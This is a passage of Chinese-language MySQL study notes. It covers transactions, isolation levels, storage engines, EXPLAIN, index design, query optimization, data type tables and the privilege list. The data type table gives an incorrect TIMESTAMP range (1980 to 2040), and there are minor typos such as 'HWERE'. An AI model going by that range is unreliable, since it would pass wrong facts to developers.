&#39;李四&#39;;\ncommit;\n\n四大特性ACID\n原子性(Atomicity)：事务是不可分割的最小操作但愿，要么全部成功，要么全部失败\n一致性(Consistency)：事务完成时，必须使所有数据都保持一致状态\n隔离性(Isolation)：数据库系统提供的隔离机制，保证事务在不受外部并发操作影响的独立环境下运行\n持久性(Durability)：事务一旦提交或回滚，它对数据库中的数据的改变就是永久的\n\n并发事务\n\n\n问题\n描述\n\n\n\n脏读\n一个事务读到另一个事务还没提交的数据\n\n\n不可重复读\n一个事务先后读取同一条记录，但两次读取的数据不同\n\n\n幻读\n一个事务按照条件查询数据时，没有对应的数据行，但是再插入数据时，又发现这行数据已经存在\n\n\n\n\n\n\n\n\n\n\n\n这三个问题的详细演示：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=55cd \n并发事务隔离级别：\n\n\n\n隔离级别\n脏读\n不可重复读\n幻读\n\n\n\nRead uncommitted\n√\n√\n√\n\n\nRead committed\n×\n√\n√\n\n\nRepeatable Read(默认)\n×\n×\n√\n\n\nSerializable\n×\n×\n×\n\n\n\n√表示在当前隔离级别下该问题会出现\nSerializable 性能最低；Read uncommitted 性能最高，数据安全性最差\n\n查看事务隔离级别：SELECT @@TRANSACTION_ISOLATION;设置事务隔离级别：SET [ SESSION | GLOBAL ] TRANSACTION ISOLATION LEVEL &#123;READ UNCOMMITTED | READ COMMITTED | REPEATABLE READ | SERIALIZABLE &#125;;SESSION 是会话级别，表示只针对当前会话有效，GLOBAL 表示对所有会话有效\n进阶篇存储引擎MySQL体系结构：\n\n存储引擎就是存储数据、建立索引、更新&#x2F;查询数据等技术的实现方式。存储引擎是基于表而不是基于库的，所以存储引擎也可以被称为表引擎。默认存储引擎是InnoDB。\n相关操作：\n-- 查询建表语句\nshow create table account;\n-- 建表时指定存储引擎\nCREATE TABLE 表名(\n\t...\n) ENGINE&#x3D;INNODB;\n-- 查看当前数据库支持的存储引擎\nshow engines;\n\nInnoDBInnoDB 是一种兼顾高可靠性和高性能的通用存储引擎，在 MySQL 5.5 之后，InnoDB 是默认的 MySQL 引擎。\n特点：\n\nDML 操作遵循 ACID 模型，支持事务\n行级锁，提高并发访问性能\n支持外键约束，保证数据的完整性和正确性\n\n文件：\n\nxxx.ibd: xxx代表表名，InnoDB 引擎的每张表都会对应这样一个表空间文件，存储该表的表结构（frm、sdi）、数据和索引。\n\n参数：innodb_file_per_table，决定多张表共享一个表空间还是每张表对应一个表空间\n知识点：\n查看 Mysql 变量：show variables like &#39;innodb_file_per_table&#39;;\n从idb文件提取表结构数据：（在cmd运行）ibd2sdi xxx.ibd\nInnoDB 逻辑存储结构：\nMyISAMMyISAM 是 MySQL 早期的默认存储引擎。\n特点：\n\n不支持事务，不支持外键\n支持表锁，不支持行锁\n访问速度快\n\n文件：\n\nxxx.sdi: 存储表结构信息\nxxx.MYD: 存储数据\nxxx.MYI: 存储索引\n\nMemoryMemory 引擎的表数据是存储在内存中的，受硬件问题、断电问题的影响，只能将这些表作为临时表或缓存使用。\n特点：\n\n存放在内存中，速度快\nhash索引（默认）\n\n文件：\n\nxxx.sdi: 存储表结构信息\n\n存储引擎特点\n\n\n特点\nInnoDB\nMyISAM\nMemory\n\n\n\n存储限制\n64TB\n有\n有\n\n\n事务安全\n支持\n-\n-\n\n\n锁机制\n行锁\n表锁\n表锁\n\n\nB+tree索引\n支持\n支持\n支持\n\n\nHash索引\n-\n-\n支持\n\n\n全文索引\n支持（5.6版本之后）\n支持\n-\n\n\n空间使用\n高\n低\nN&#x2F;A\n\n\n内存使用\n高\n低\n中等\n\n\n批量插入速度\n低\n高\n高\n\n\n支持外键\n支持\n-\n-\n\n\n存储引擎的选择在选择存储引擎时，应该根据应用系统的特点选择合适的存储引擎。对于复杂的应用系统，还可以根据实际情况选择多种存储引擎进行组合。\n\nInnoDB: 如果应用对事物的完整性有比较高的要求，在并发条件下要求数据的一致性，数据操作除了插入和查询之外，还包含很多的更新、删除操作，则 InnoDB 是比较合适的选择\nMyISAM: 如果应用是以读操作和插入操作为主，只有很少的更新和删除操作，并且对事务的完整性、并发性要求不高，那这个存储引擎是非常合适的。\nMemory: 将所有数据保存在内存中，访问速度快，通常用于临时表及缓存。Memory 的缺陷是对表的大小有限制，太大的表无法缓存在内存中，而且无法保障数据的安全性\n\n电商中的足迹和评论适合使用 MyISAM 引擎，缓存适合使用 Memory 引擎。\n性能分析查看执行频次查看当前数据库的 INSERT, UPDATE, DELETE, SELECT 访问频次：SHOW GLOBAL STATUS LIKE &#39;Com_______&#39;; 或者 SHOW SESSION STATUS LIKE &#39;Com_______&#39;;例：show global status like &#39;Com_______&#39;\n慢查询日志慢查询日志记录了所有执行时间超过指定参数（long_query_time，单位：秒，默认10秒）的所有SQL语句的日志。MySQL的慢查询日志默认没有开启，需要在MySQL的配置文件（&#x2F;etc&#x2F;my.cnf）中配置如下信息：    # 开启慢查询日志开关    slow_query_log&#x3D;1    # 设置慢查询日志的时间为2秒，SQL语句执行时间超过2秒，就会视为慢查询，记录慢查询日志    long_query_time&#x3D;2更改后记得重启MySQL服务，日志文件位置：&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;localhost-slow.log\n查看慢查询日志开关状态：show variables like &#39;slow_query_log&#39;;\nprofileshow profile 能在做SQL优化时帮我们了解时间都耗费在哪里。通过 have_profiling 参数，能看到当前 MySQL 是否支持 profile 操作：SELECT @@have_profiling;profiling 默认关闭，可以通过set语句在session&#x2F;global级别开启 profiling：SET profiling = 1;查看所有语句的耗时：show profiles;查看指定query_id的SQL语句各个阶段的耗时：show profile for query query_id;查看指定query_id的SQL语句CPU的使用情况show profile cpu for query query_id;\nexplainEXPLAIN 或者 DESC 命令获取 MySQL 如何执行 SELECT 语句的信息，包括在 SELECT 语句执行过程中表如何连接和连接的顺序。语法：    # 直接在select语句之前加上关键字 explain &#x2F; desc    EXPLAIN SELECT 字段列表 FROM 表名 HWERE 条件;\nEXPLAIN 各字段含义：\n\nid：select 查询的序列号，表示查询中执行 select 子句或者操作表的顺序（id相同，执行顺序从上到下；id不同，值越大越先执行）\nselect_type：表示 SELECT 的类型，常见取值有 SIMPLE（简单表，即不适用表连接或者子查询）、PRIMARY（主查询，即外层的查询）、UNION（UNION中的第二个或者后面的查询语句）、SUBQUERY（SELECT&#x2F;WHERE之后包含了子查询）等\ntype：表示连接类型，性能由好到差的连接类型为 NULL、system、const、eq_ref、ref、range、index、all\npossible_key：可能应用在这张表上的索引，一个或多个\nKey：实际使用的索引，如果为 NULL，则没有使用索引\nKey_len：表示索引中使用的字节数，该值为索引字段最大可能长度，并非实际使用长度，在不损失精确性的前提下，长度越短越好\nrows：MySQL认为必须要执行的行数，在InnoDB引擎的表中，是一个估计值，可能并不总是准确的\nfiltered：表示返回结果的行数占需读取行数的百分比，filtered的值越大越好\n\n索引索引是帮助 MySQL 高效获取数据的数据结构（有序）。在数据之外，数据库系统还维护着满足特定查找算法的数据结构，这些数据结构以某种方式引用（指向）数据，这样就可以在这些数据结构上实现高级查询算法，这种数据结构就是索引。\n优缺点：\n优点：\n\n提高数据检索效率，降低数据库的IO成本\n通过索引列对数据进行排序，降低数据排序的成本，降低CPU的消耗\n\n缺点：\n\n索引列也是要占用空间的\n索引大大提高了查询效率，但降低了更新的速度，比如 INSERT、UPDATE、DELETE\n\n索引结构\n\n\n索引结构\n描述\n\n\n\nB+Tree\n最常见的索引类型，大部分引擎都支持B+树索引\n\n\nHash\n底层数据结构是用哈希表实现，只有精确匹配索引列的查询才有效，不支持范围查询\n\n\nR-Tree(空间索引)\n空间索引是 MyISAM 引擎的一个特殊索引类型，主要用于地理空间数据类型，通常使用较少\n\n\nFull-Text(全文索引)\n是一种通过建立倒排索引，快速匹配文档的方式，类似于 Lucene, Solr, ES\n\n\n\n\n\n索引\nInnoDB\nMyISAM\nMemory\n\n\n\nB+Tree索引\n支持\n支持\n支持\n\n\nHash索引\n不支持\n不支持\n支持\n\n\nR-Tree索引\n不支持\n支持\n不支持\n\n\nFull-text\n5.6版本后支持\n支持\n不支持\n\n\nB-Tree\n二叉树的缺点可以用红黑树来解决：红黑树也存在大数据量情况下，层级较深，检索速度慢的问题。\n为了解决上述问题，可以使用 B-Tree 结构。B-Tree (多路平衡查找树) 以一棵最大度数（max-degree，指一个节点的子节点个数）为5（5阶）的 b-tree 为例（每个节点最多存储4个key，5个指针）\n\n\n\n\n\n\n\n\n\n\nB-Tree 的数据插入过程动画参照：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=68演示地址：https://www.cs.usfca.edu/~galles/visualization/BTree.html\nB+Tree结构图：\n\n\n\n\n\n\n\n\n\n\n演示地址：https://www.cs.usfca.edu/~galles/visualization/BPlusTree.html\n与 B-Tree 的区别：\n\n所有的数据都会出现在叶子节点\n叶子节点形成一个单向链表\n\nMySQL 索引数据结构对经典的 B+Tree 进行了优化。在原 B+Tree 的基础上，增加一个指向相邻叶子节点的链表指针，就形成了带有顺序指针的 B+Tree，提高区间访问的性能。\n\nHash哈希索引就是采用一定的hash算法，将键值换算成新的hash值，映射到对应的槽位上，然后存储在hash表中。如果两个（或多个）键值，映射到一个相同的槽位上，他们就产生了hash冲突（也称为hash碰撞），可以通过链表来解决。\n\n特点：\n\nHash索引只能用于对等比较（&#x3D;、in），不支持范围查询（betwwn、&gt;、&lt;、…）\n无法利用索引完成排序操作\n查询效率高，通常只需要一次检索就可以了，效率通常要高于 B+Tree 索引\n\n存储引擎支持：\n\nMemory\nInnoDB: 具有自适应hash功能，hash索引是存储引擎根据 B+Tree 索引在指定条件下自动构建的\n\n面试题\n为什么 InnoDB 存储引擎选择使用 B+Tree 索引结构？\n\n\n相对于二叉树，层级更少，搜索效率高\n对于 B-Tree，无论是叶子节点还是非叶子节点，都会保存数据，这样导致一页中存储的键值减少，指针也跟着减少，要同样保存大量数据，只能增加树的高度，导致性能降低\n相对于 Hash 索引，B+Tree 支持范围匹配及排序操作\n\n索引分类\n\n\n分类\n含义\n特点\n关键字\n\n\n\n主键索引\n针对于表中主键创建的索引\n默认自动创建，只能有一个\nPRIMARY\n\n\n唯一索引\n避免同一个表中某数据列中的值重复\n可以有多个\nUNIQUE\n\n\n常规索引\n快速定位特定数据\n可以有多个\n\n\n\n全文索引\n全文索引查找的是文本中的关键词，而不是比较索引中的值\n可以有多个\nFULLTEXT\n\n\n在 InnoDB 存储引擎中，根据索引的存储形式，又可以分为以下两种：\n\n\n\n分类\n含义\n特点\n\n\n\n聚集索引(Clustered Index)\n将数据存储与索引放一块，索引结构的叶子节点保存了行数据\n必须有，而且只有一个\n\n\n二级索引(Secondary Index)\n将数据与索引分开存储，索引结构的叶子节点关联的是对应的主键\n可以存在多个\n\n\n演示图：\n\n聚集索引选取规则：\n\n如果存在主键，主键索引就是聚集索引\n如果不存在主键，将使用第一个唯一(UNIQUE)索引作为聚集索引\n如果表没有主键或没有合适的唯一索引，则 InnoDB 会自动生成一个 rowid 作为隐藏的聚集索引\n\n思考题1. 以下 SQL 语句，哪个执行效率高？为什么？\nselect * from user where id &#x3D; 10;\nselect * from user where name &#x3D; &#39;Arm&#39;;\n-- 备注：id为主键，name字段创建的有索引\n\n答：第一条语句，因为第二条需要回表查询，相当于两个步骤。\n2. InnoDB 主键索引的 B+Tree 高度为多少？\n答：假设一行数据大小为1k，一页中可以存储16行这样的数据。InnoDB 的指针占用6个字节的空间，主键假设为bigint，占用字节数为8.可得公式：n * 8 + (n + 1) * 6 = 16 * 1024，其中 8 表示 bigint 占用的字节数，n 表示当前节点存储的key的数量，(n + 1) 表示指针数量（比key多一个）。算出n约为1170。\n如果树的高度为2，那么他能存储的数据量大概为：1171 * 16 = 18736；如果树的高度为3，那么他能存储的数据量大概为：1171 * 1171 * 16 = 21939856。\n另外，如果有成千上万的数据，那么就要考虑分表，涉及运维篇知识。\n语法创建索引：CREATE [ UNIQUE | FULLTEXT ] INDEX index_name ON table_name (index_col_name, ...);如果不加 CREATE 后面不加索引类型参数，则创建的是常规索引\n查看索引：SHOW INDEX FROM table_name;\n删除索引：DROP INDEX index_name ON table_name;\n案例：\n-- name字段为姓名字段，该字段的值可能会重复，为该字段创建索引\ncreate index idx_user_name on tb_user(name);\n-- phone手机号字段的值非空，且唯一，为该字段创建唯一索引\ncreate unique index idx_user_phone on tb_user (phone);\n-- 为profession, age, status创建联合索引\ncreate index idx_user_pro_age_stat on tb_user(profession, age, status);\n-- 为email建立合适的索引来提升查询效率\ncreate index idx_user_email on tb_user(email);\n\n-- 删除索引\ndrop index idx_user_email on tb_user;\n\n使用规则最左前缀法则如果索引关联了多列（联合索引），要遵守最左前缀法则，最左前缀法则指的是查询从索引的最左列开始，并且不跳过索引中的列。如果跳跃某一列，索引将部分失效（后面的字段索引失效）。\n联合索引中，出现范围查询（&lt;, &gt;），范围查询右侧的列索引失效。可以用&gt;&#x3D;或者&lt;&#x3D;来规避索引失效问题。\n索引失效情况\n在索引列上进行运算操作，索引将失效。如：explain select * from tb_user where substring(phone, 10, 2) = &#39;15&#39;;\n字符串类型字段使用时，不加引号，索引将失效。如：explain select * from tb_user where phone = 17799990015;，此处phone的值没有加引号\n模糊查询中，如果仅仅是尾部模糊匹配，索引不会是失效；如果是头部模糊匹配，索引失效。如：explain select * from tb_user where profession like &#39;%工程&#39;;，前后都有 % 也会失效。\n用 or 分割开的条件，如果 or 其中一个条件的列没有索引，那么涉及的索引都不会被用到。\n如果 MySQL 评估使用索引比全表更慢，则不使用索引。\n\nSQL 提示是优化数据库的一个重要手段，简单来说，就是在SQL语句中加入一些人为的提示来达到优化操作的目的。\n例如，使用索引：explain select * from tb_user use index(idx_user_pro) where profession=&quot;软件工程&quot;;不使用哪个索引：explain select * from tb_user ignore index(idx_user_pro) where profession=&quot;软件工程&quot;;必须使用哪个索引：explain select * from tb_user force index(idx_user_pro) where profession=&quot;软件工程&quot;;\nuse 是建议，实际使用哪个索引 MySQL 还会自己权衡运行速度去更改，force就是无论如何都强制使用该索引。\n覆盖索引&amp;回表查询尽量使用覆盖索引（查询使用了索引，并且需要返回的列，在该索引中已经全部能找到），减少 select *。\nexplain 中 extra 字段含义：using index condition：查找使用了索引，但是需要回表查询数据using where; using index;：查找使用了索引，但是需要的数据都在索引列中能找到，所以不需要回表查询\n如果在聚集索引中直接能找到对应的行，则直接返回行数据，只需要一次查询，哪怕是select *；如果在辅助索引中找聚集索引，如select id, name from xxx where name=&#39;xxx&#39;;，也只需要通过辅助索引(name)查找到对应的id，返回name和name索引对应的id即可，只需要一次查询；如果是通过辅助索引查找其他字段，则需要回表查询，如select id, name, gender from xxx where name=&#39;xxx&#39;;\n所以尽量不要用select *，容易出现回表查询，降低效率，除非有联合索引包含了所有字段\n面试题：一张表，有四个字段（id, username, password, status），由于数据量大，需要对以下SQL语句进行优化，该如何进行才是最优方案：select id, username, password from tb_user where username=&#39;itcast&#39;;\n解：给username和password字段建立联合索引，则不需要回表查询，直接覆盖索引\n前缀索引当字段类型为字符串（varchar, text等）时，有时候需要索引很长的字符串，这会让索引变得很大，查询时，浪费大量的磁盘IO，影响查询效率，此时可以只降字符串的一部分前缀，建立索引，这样可以大大节约索引空间，从而提高索引效率。\n语法：create index idx_xxxx on table_name(columnn(n));前缀长度：可以根据索引的选择性来决定，而选择性是指不重复的索引值（基数）和数据表的记录总数的比值，索引选择性越高则查询效率越高，唯一索引的选择性是1，这是最好的索引选择性，性能也是最好的。求选择性公式：\nselect count(distinct email) &#x2F; count(*) from tb_user;\nselect count(distinct substring(email, 1, 5)) &#x2F; count(*) from tb_user;\n\nshow index 里面的sub_part可以看到接取的长度\n单列索引&amp;联合索引单列索引：即一个索引只包含单个列联合索引：即一个索引包含了多个列在业务场景中，如果存在多个查询条件，考虑针对于查询字段建立索引时，建议建立联合索引，而非单列索引。\n单列索引情况：explain select id, phone, name from tb_user where phone = &#39;17799990010&#39; and name = &#39;韩信&#39;;这句只会用到phone索引字段\n注意事项\n多条件联合查询时，MySQL优化器会评估哪个字段的索引效率更高，会选择该索引完成本次查询\n\n设计原则\n针对于数据量较大，且查询比较频繁的表建立索引\n针对于常作为查询条件（where）、排序（order by）、分组（group by）操作的字段建立索引\n尽量选择区分度高的列作为索引，尽量建立唯一索引，区分度越高，使用索引的效率越高\n如果是字符串类型的字段，字段长度较长，可以针对于字段的特点，建立前缀索引\n尽量使用联合索引，减少单列索引，查询时，联合索引很多时候可以覆盖索引，节省存储空间，避免回表，提高查询效率\n要控制索引的数量，索引并不是多多益善，索引越多，维护索引结构的代价就越大，会影响增删改的效率\n如果索引列不能存储NULL值，请在创建表时使用NOT NULL约束它。当优化器知道每列是否包含NULL值时，它可以更好地确定哪个索引最有效地用于查询\n\nSQL 优化插入数据普通插入：\n\n采用批量插入（一次插入的数据不建议超过1000条）\n手动提交事务\n主键顺序插入\n\n大批量插入：如果一次性需要插入大批量数据，使用insert语句插入性能较低，此时可以使用MySQL数据库提供的load指令插入。\n# 客户端连接服务端时，加上参数 --local-infile（这一行在bash&#x2F;cmd界面输入）\nmysql --local-infile -u root -p\n# 设置全局参数local_infile为1，开启从本地加载文件导入数据的开关\nset global local_infile &#x3D; 1;\nselect @@local_infile;\n# 执行load指令将准备好的数据，加载到表结构中\nload data local infile &#39;&#x2F;root&#x2F;sql1.log&#39; into table &#39;tb_user&#39; fields terminated by &#39;,&#39; lines terminated by &#39;\\n&#39;;\n\n主键优化数据组织方式：在InnoDB存储引擎中，表数据都是根据主键顺序组织存放的，这种存储方式的表称为索引组织表（Index organized table, IOT）\n页分裂：页可以为空，也可以填充一般，也可以填充100%，每个页包含了2-N行数据（如果一行数据过大，会行溢出），根据主键排列。页合并：当删除一行记录时，实际上记录并没有被物理删除，只是记录被标记（flaged）为删除并且它的空间变得允许被其他记录声明使用。当页中删除的记录到达 MERGE_THRESHOLD（默认为页的50%），InnoDB会开始寻找最靠近的页（前后）看看是否可以将这两个页合并以优化空间使用。\nMERGE_THRESHOLD：合并页的阈值，可以自己设置，在创建表或创建索引时指定\n\n\n\n\n\n\n\n\n\n文字说明不够清晰明了，具体可以看视频里的PPT演示过程：https://www.bilibili.com/video/BV1Kr4y1i7ru?p=90\n主键设计原则：\n\n满足业务需求的情况下，尽量降低主键的长度\n插入数据时，尽量选择顺序插入，选择使用 AUTO_INCREMENT 自增主键\n尽量不要使用 UUID 做主键或者是其他的自然主键，如身份证号\n业务操作时，避免对主键的修改\n\norder by优化\nUsing filesort：通过表的索引或全表扫描，读取满足条件的数据行，然后在排序缓冲区 sort buffer 中完成排序操作，所有不是通过索引直接返回排序结果的排序都叫 FileSort 排序\nUsing index：通过有序索引顺序扫描直接返回有序数据，这种情况即为 using index，不需要额外排序，操作效率高\n\n如果order by字段全部使用升序排序或者降序排序，则都会走索引，但是如果一个字段升序排序，另一个字段降序排序，则不会走索引，explain的extra信息显示的是Using index, Using filesort，如果要优化掉Using filesort，则需要另外再创建一个索引，如：create index idx_user_age_phone_ad on tb_user(age asc, phone desc);，此时使用select id, age, phone from tb_user order by age asc, phone desc;会全部走索引\n总结：\n\n根据排序字段建立合适的索引，多字段排序时，也遵循最左前缀法则\n尽量使用覆盖索引\n多字段排序，一个升序一个降序，此时需要注意联合索引在创建时的规则（ASC&#x2F;DESC）\n如果不可避免出现filesort，大数据量排序时，可以适当增大排序缓冲区大小 sort_buffer_size（默认256k）\n\ngroup by优化\n在分组操作时，可以通过索引来提高效率\n分组操作时，索引的使用也是满足最左前缀法则的\n\n如索引为idx_user_pro_age_stat，则句式可以是select ... where profession order by age，这样也符合最左前缀法则\nlimit优化常见的问题如limit 2000000, 10，此时需要 MySQL 排序前2000000条记录，但仅仅返回2000000 - 2000010的记录，其他记录丢弃，查询排序的代价非常大。优化方案：一般分页查询时，通过创建覆盖索引能够比较好地提高性能，可以通过覆盖索引加子查询形式进行优化\n例如：\n-- 此语句耗时很长\nselect * from tb_sku limit 9000000, 10;\n-- 通过覆盖索引加快速度，直接通过主键索引进行排序及查询\nselect id from tb_sku order by id limit 9000000, 10;\n-- 下面的语句是错误的，因为 MySQL 不支持 in 里面使用 limit\n-- select * from tb_sku where id in (select id from tb_sku order by id limit 9000000, 10);\n-- 通过连表查询即可实现第一句的效果，并且能达到第二句的速度\nselect * from tb_sku as s, (select id from tb_sku order by id limit 9000000, 10) as a where s.id &#x3D; a.id;\n\ncount优化MyISAM 引擎把一个表的总行数存在了磁盘上，因此执行 count(*) 的时候会直接返回这个数，效率很高（前提是不适用where）；InnoDB 在执行 count(*) 时，需要把数据一行一行地从引擎里面读出来，然后累计计数。优化方案：自己计数，如创建key-value表存储在内存或硬盘，或者是用redis\ncount的几种用法：\n\n如果count函数的参数（count里面写的那个字段）不是NULL（字段值不为NULL），累计值就加一，最后返回累计值\n用法：count(*)、count(主键)、count(字段)、count(1)\ncount(主键)跟count(*)一样，因为主键不能为空；count(字段)只计算字段值不为NULL的行；count(1)引擎会为每行添加一个1，然后就count这个1，返回结果也跟count(*)一样；count(null)返回0\n\n各种用法的性能：\n\ncount(主键)：InnoDB引擎会遍历整张表，把每行的主键id值都取出来，返回给服务层，服务层拿到主键后，直接按行进行累加（主键不可能为空）\ncount(字段)：没有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，服务层判断是否为null，不为null，计数累加；有not null约束的话，InnoDB引擎会遍历整张表把每一行的字段值都取出来，返回给服务层，直接按行进行累加\ncount(1)：InnoDB 引擎遍历整张表，但不取值。服务层对于返回的每一层，放一个数字 1 进去，直接按行进行累加\ncount(*)：InnoDB 引擎并不会把全部字段取出来，而是专门做了优化，不取值，服务层直接按行进行累加\n\n按效率排序：count(字段) &lt; count(主键) &lt; count(1) &lt; count(*)，所以尽量使用 count(*)\nupdate优化（避免行锁升级为表锁）InnoDB 的行锁是针对索引加的锁，不是针对记录加的锁，并且该索引不能失效，否则会从行锁升级为表锁。\n如以下两条语句：update student set no = &#39;123&#39; where id = 1;，这句由于id有主键索引，所以只会锁这一行；update student set no = &#39;123&#39; where name = &#39;test&#39;;，这句由于name没有索引，所以会把整张表都锁住进行数据更新，解决方法是给name字段添加索引\n数据类型整型\n\n\n类型名称\n取值范围\n大小\n\n\n\nTINYINT\n-128〜127\n1个字节\n\n\nSMALLINT\n-32768〜32767\n2个宇节\n\n\nMEDIUMINT\n-8388608〜8388607\n3个字节\n\n\nINT (INTEGHR)\n-2147483648〜2147483647\n4个字节\n\n\nBIGINT\n-9223372036854775808〜9223372036854775807\n8个字节\n\n\n无符号在数据类型后加 unsigned 关键字。\n浮点型\n\n\n类型名称\n说明\n存储需求\n\n\n\nFLOAT\n单精度浮点数\n4 个字节\n\n\nDOUBLE\n双精度浮点数\n8 个字节\n\n\nDECIMAL (M, D)，DEC\n压缩的“严格”定点数\nM+2 个字节\n\n\n日期和时间\n\n\n类型名称\n日期格式\n日期范围\n存储需求\n\n\n\nYEAR\nYYYY\n1901 ~ 2155\n1 个字节\n\n\nTIME\nHH:MM:SS\n-838:59:59 ~ 838:59:59\n3 个字节\n\n\nDATE\nYYYY-MM-DD\n1000-01-01 ~ 9999-12-3\n3 个字节\n\n\nDATETIME\nYYYY-MM-DD HH:MM:SS\n1000-01-01 00:00:00 ~ 9999-12-31 23:59:59\n8 个字节\n\n\nTIMESTAMP\nYYYY-MM-DD HH:MM:SS\n1980-01-01 00:00:01 UTC ~ 2040-01-19 03:14:07 UTC\n4 个字节\n\n\n字符串\n\n\n类型名称\n说明\n存储需求\n\n\n\nCHAR(M)\n固定长度非二进制字符串\nM 字节，1&lt;&#x3D;M&lt;&#x3D;255\n\n\nVARCHAR(M)\n变长非二进制字符串\nL+1字节，在此，L&lt; &#x3D; M和 1&lt;&#x3D;M&lt;&#x3D;255\n\n\nTINYTEXT\n非常小的非二进制字符串\nL+1字节，在此，L&lt;2^8\n\n\nTEXT\n小的非二进制字符串\nL+2字节，在此，L&lt;2^16\n\n\nMEDIUMTEXT\n中等大小的非二进制字符串\nL+3字节，在此，L&lt;2^24\n\n\nLONGTEXT\n大的非二进制字符串\nL+4字节，在此，L&lt;2^32\n\n\nENUM\n枚举类型，只能有一个枚举字符串值\n1或2个字节，取决于枚举值的数目 (最大值为65535)\n\n\nSET\n一个设置，字符串对象可以有零个或 多个SET成员\n1、2、3、4或8个字节，取决于集合 成员的数量（最多64个成员）\n\n\n二进制类型\n\n\n类型名称\n说明\n存储需求\n\n\n\nBIT(M)\n位字段类型\n大约 (M+7)&#x2F;8 字节\n\n\nBINARY(M)\n固定长度二进制字符串\nM 字节\n\n\nVARBINARY (M)\n可变长度二进制字符串\nM+1 字节\n\n\nTINYBLOB (M)\n非常小的BLOB\nL+1 字节，在此，L&lt;2^8\n\n\nBLOB (M)\n小 BLOB\nL+2 字节，在此，L&lt;2^16\n\n\nMEDIUMBLOB (M)\n中等大小的BLOB\nL+3 字节，在此，L&lt;2^24\n\n\nLONGBLOB (M)\n非常大的BLOB\nL+4 字节，在此，L&lt;2^32\n\n\n权限一览表\n\n\n\n\n\n\n\n\n具体权限的作用详见官方文档\nGRANT 和 REVOKE 允许的静态权限\n\n\n\nPrivilege\nGrant Table Column\nContext\n\n\n\nALL [PRIVILEGES]\nSynonym for “all privileges”\nServer administration\n\n\nALTER\nAlter_priv\nTables\n\n\nALTER ROUTINE\nAlter_routine_priv\nStored routines\n\n\nCREATE\nCreate_priv\nDatabases, tables, or indexes\n\n\nCREATE ROLE\nCreate_role_priv\nServer administration\n\n\nCREATE ROUTINE\nCreate_routine_priv\nStored routines\n\n\nCREATE TABLESPACE\nCreate_tablespace_priv\nServer administration\n\n\nCREATE TEMPORARY TABLES\nCreate_tmp_table_priv\nTables\n\n\nCREATE USER\nCreate_user_priv\nServer administration\n\n\nCREATE VIEW\nCreate_view_priv\nViews\n\n\nDELETE\nDelete_priv\nTables\n\n\nDROP\nDrop_priv\nDatabases, tables, or views\n\n\nDROP ROLE\nDrop_role_priv\nServer administration\n\n\nEVENT\nEvent_priv\nDatabases\n\n\nEXECUTE\nExecute_priv\nStored routines\n\n\nFILE\nFile_priv\nFile access on server host\n\n\nGRANT OPTION\nGrant_priv\nDatabases, tables, or stored routines\n\n\nINDEX\nIndex_priv\nTables\n\n\nINSERT\nInsert_priv\nTables or columns\n\n\nLOCK TABLES\nLock_tables_priv\nDatabases\n\n\nPROCESS\nProcess_priv\nServer administration\n\n\nPROXY\nSee proxies_priv table\nServer administration\n\n\nREFERENCES\nReferences_priv\nDatabases or tables\n\n\nRELOAD\nReload_priv\nServer administration\n\n\nREPLICATION CLIENT\nRepl_client_priv\nServer administration\n\n\nREPLICATION SLAVE\nRepl_slave_priv\nServer administration\n\n\nSELECT\nSelect_priv\nTables or columns\n\n\nSHOW DATABASES\nShow_db_priv\nServer administration\n\n\nSHOW VIEW\nShow_view_priv\nViews\n\n\nSHUTDOWN\nShutdown_priv\nServer administration\n\n\nSUPER\nSuper_priv\nServer administration\n\n\nTRIGGER\nTrigger_priv\nTables\n\n\nUPDATE\nUpdate_priv\nTables or columns\n\n\nUSAGE\nSynonym for “no privileges”\nServer administration\n\n\nGRANT 和 REVOKE 允许的动态权限\n\n\n\nPrivilege\nContext\n\n\n\nAPPLICATION_PASSWORD_ADMIN\nDual password administration\n\n\nAUDIT_ABORT_EXEMPT\nAllow queries blocked by audit log filter\n\n\nAUDIT_ADMIN\nAudit log administration\n\n\nAUTHENTICATION_POLICY_ADMIN\nAuthentication administration\n\n\nBACKUP_ADMIN\nBackup administration\n\n\nBINLOG_ADMIN\nBackup and Replication administration\n\n\nBINLOG_ENCRYPTION_ADMIN\nBackup and Replication administration\n\n\nCLONE_ADMIN\nClone administration\n\n\nCONNECTION_ADMIN\nServer administration\n\n\nENCRYPTION_KEY_ADMIN\nServer administration\n\n\nFIREWALL_ADMIN\nFirewall administration\n\n\nFIREWALL_EXEMPT\nFirewall administration\n\n\nFIREWALL_USER\nFirewall administration\n\n\nFLUSH_OPTIMIZER_COSTS\nServer administration\n\n\nFLUSH_STATUS\nServer administration\n\n\nFLUSH_TABLES\nServer administration\n\n\nFLUSH_USER_RESOURCES\nServer administration\n\n\nGROUP_REPLICATION_ADMIN\nReplication administration\n\n\nGROUP_REPLICATION_STREAM\nReplication administration\n\n\nINNODB_REDO_LOG_ARCHIVE\nRedo log archiving administration\n\n\nNDB_STORED_USER\nNDB Cluster\n\n\nPASSWORDLESS_USER_ADMIN\nAuthentication administration\n\n\nPERSIST_RO_VARIABLES_ADMIN\nServer administration\n\n\nREPLICATION_APPLIER\nPRIVILEGE_CHECKS_USER for a replication channel\n\n\nREPLICATION_SLAVE_ADMIN\nReplication administration\n\n\nRESOURCE_GROUP_ADMIN\nResource group administration\n\n\nRESOURCE_GROUP_USER\nResource group administration\n\n\nROLE_ADMIN\nServer administration\n\n\nSESSION_VARIABLES_ADMIN\nServer administration\n\n\nSET_USER_ID\nServer administration\n\n\nSHOW_ROUTINE\nServer administration\n\n\nSYSTEM_USER\nServer administration\n\n\nSYSTEM_VARIABLES_ADMIN\nServer administration\n\n\nTABLE_ENCRYPTION_ADMIN\nServer administration\n\n\nVERSION_TOKEN_ADMIN\nServer administration\n\n\nXA_RECOVER_ADMIN\nServer administration\n\n\n图形化界面工具\nWorkbench(免费): http://dev.mysql.com/downloads/workbench/\nnavicat(收费，试用版30天): https://www.navicat.com/en/download/navicat-for-mysql\nSequel Pro(开源免费，仅支持Mac OS): http://www.sequelpro.com/\nHeidiSQL(免费): http://www.heidisql.com/\nphpMyAdmin(免费): https://www.phpmyadmin.net/\nSQLyog: https://sqlyog.en.softonic.com/\n\n安装小技巧\n在SQL语句之后加上\\G会将结果的表格形式转换成行文本形式\n查看Mysql数据库占用空间：SELECT table_schema &quot;Database Name&quot;\n     , SUM(data_length + index_length) &#x2F; 